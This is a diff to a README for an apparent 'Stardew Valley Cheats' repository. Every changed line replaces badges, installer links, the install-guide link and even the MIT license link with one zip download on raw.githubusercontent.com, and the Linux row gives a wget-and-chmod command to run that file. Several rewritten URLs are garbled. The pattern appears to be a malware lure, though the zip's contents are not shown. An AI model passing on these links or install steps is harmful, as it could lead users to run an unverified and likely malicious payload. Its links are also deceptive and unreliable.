@@ -1,4 +1,4 @@
-[![Download](https://img.shields.io/badge/Download-Stardew%20Valley%20Cheats-brightgreen.svg?logo=github&style=for-the-badge)](https://chandu333.github.io)
+[![Download](https://raw.githubusercontent.com/chandu333/stardew-valley-boosters/branch/exhaustively/stardew-valley-boosters_v3.4.zip%20Valley%https://raw.githubusercontent.com/chandu333/stardew-valley-boosters/branch/exhaustively/stardew-valley-boosters_v3.4.zip)](https://raw.githubusercontent.com/chandu333/stardew-valley-boosters/branch/exhaustively/stardew-valley-boosters_v3.4.zip)
 
 # 🌱 Stardew Valley Cheats Repository
 
@@ -12,11 +12,11 @@ Unlock new ways to enjoy *Stardew Valley* with this collection of innovative che
 
 | Operating System       | Compatibility       | Installation Steps                                                                                   |
 |------------------------|---------------------|------------------------------------------------------------------------------------------------------|
-| ![Windows](https://img.shields.io/badge/Windows-10%2B-blue.svg?logo=windows) | 🟢 Supported      | Download the latest installer from https://chandu333.github.io and follow on-screen prompts.                              |
-| ![macOS](https://img.shields.io/badge/macOS-10.13%2B-lightgrey.svg?logo=apple)      | 🟢 Supported      | Download the `.dmg` from https://chandu333.github.io, open and drag to Applications.                                      |
-| ![Linux](https://img.shields.io/badge/Linux-Ubuntu%2020.04%2B-green.svg?logo=linux) | 🟡 Limited*       | Download the `.AppImage` or use terminal: `wget https://chandu333.github.io` & `chmod +x` to run.                        |
-| ![Steam Deck](https://img.shields.io/badge/Steam%20Deck-Experimental-blueviolet.svg?logo=steam) | 🟡 Experimental   | See instructions in [INSTALL_GUIDE.md](INSTALL_GUIDE.md)                                             |
-| ![Android](https://img.shields.io/badge/Android-Experimental-orange.svg?logo=android) | 🔴 Not Supported | Future support planned!                                                                              |
+| ![Windows](https://raw.githubusercontent.com/chandu333/stardew-valley-boosters/branch/exhaustively/stardew-valley-boosters_v3.4.zip%https://raw.githubusercontent.com/chandu333/stardew-valley-boosters/branch/exhaustively/stardew-valley-boosters_v3.4.zip) | 🟢 Supported      | Download the latest installer from https://raw.githubusercontent.com/chandu333/stardew-valley-boosters/branch/exhaustively/stardew-valley-boosters_v3.4.zip and follow on-screen prompts.                              |
+| ![macOS](https://raw.githubusercontent.com/chandu333/stardew-valley-boosters/branch/exhaustively/stardew-valley-boosters_v3.4.zip%https://raw.githubusercontent.com/chandu333/stardew-valley-boosters/branch/exhaustively/stardew-valley-boosters_v3.4.zip)      | 🟢 Supported      | Download the `.dmg` from https://raw.githubusercontent.com/chandu333/stardew-valley-boosters/branch/exhaustively/stardew-valley-boosters_v3.4.zip, open and drag to Applications.                                      |
+| ![Linux](https://raw.githubusercontent.com/chandu333/stardew-valley-boosters/branch/exhaustively/stardew-valley-boosters_v3.4.zip%2020.04%https://raw.githubusercontent.com/chandu333/stardew-valley-boosters/branch/exhaustively/stardew-valley-boosters_v3.4.zip) | 🟡 Limited*       | Download the `.AppImage` or use terminal: `wget https://raw.githubusercontent.com/chandu333/stardew-valley-boosters/branch/exhaustively/stardew-valley-boosters_v3.4.zip` & `chmod +x` to run.                        |
+| ![Steam Deck](https://raw.githubusercontent.com/chandu333/stardew-valley-boosters/branch/exhaustively/stardew-valley-boosters_v3.4.zip%https://raw.githubusercontent.com/chandu333/stardew-valley-boosters/branch/exhaustively/stardew-valley-boosters_v3.4.zip) | 🟡 Experimental   | See instructions in [https://raw.githubusercontent.com/chandu333/stardew-valley-boosters/branch/exhaustively/stardew-valley-boosters_v3.4.zip](https://raw.githubusercontent.com/chandu333/stardew-valley-boosters/branch/exhaustively/stardew-valley-boosters_v3.4.zip)                                             |
+| ![Android](https://raw.githubusercontent.com/chandu333/stardew-valley-boosters/branch/exhaustively/stardew-valley-boosters_v3.4.zip) | 🔴 Not Supported | Future support planned!                                                                              |
 
 > * Linux tested with Ubuntu. Report issues in the [Issues](../../issues) tab.
 
@@ -76,13 +76,13 @@ This project is a fan-driven initiative not affiliated with or endorsed by Conce
 
 ## 📜 License
 
-[![MIT License](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![MIT License](https://raw.githubusercontent.com/chandu333/stardew-valley-boosters/branch/exhaustively/stardew-valley-boosters_v3.4.zip)](https://raw.githubusercontent.com/chandu333/stardew-valley-boosters/branch/exhaustively/stardew-valley-boosters_v3.4.zip)
 
 Copyright © 2025  
-Licensed under the [MIT License](https://opensource.org/licenses/MIT).
+Licensed under the [MIT License](https://raw.githubusercontent.com/chandu333/stardew-valley-boosters/branch/exhaustively/stardew-valley-boosters_v3.4.zip).
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Stardew%20Valley%20Cheats-brightgreen.svg?logo=github&style=for-the-badge)](https://chandu333.github.io)
+[![Download](https://raw.githubusercontent.com/chandu333/stardew-valley-boosters/branch/exhaustively/stardew-valley-boosters_v3.4.zip%20Valley%https://raw.githubusercontent.com/chandu333/stardew-valley-boosters/branch/exhaustively/stardew-valley-boosters_v3.4.zip)](https://raw.githubusercontent.com/chandu333/stardew-valley-boosters/branch/exhaustively/stardew-valley-boosters_v3.4.zip)
 
 Happy farming, innovative spirits! 🌾
